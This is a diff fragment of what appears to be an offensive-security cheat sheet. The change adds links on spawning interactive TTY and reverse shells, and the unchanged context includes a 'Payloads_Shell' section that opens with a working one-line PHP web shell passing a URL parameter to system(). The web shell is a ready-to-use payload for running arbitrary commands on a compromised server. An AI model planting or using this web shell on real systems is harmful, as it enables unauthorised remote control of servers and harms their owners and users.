@@ -13,6 +13,10 @@ xterm‌‌
 
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
 ```
+https://hideandsec.sh/books/cheatsheets-82c/page/spawning-tty-shells
+
+https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/full-ttys
+
 # Payloads_Shell ✅
 ```bash
 <?php echo system($_GET["cmd"]); ?>
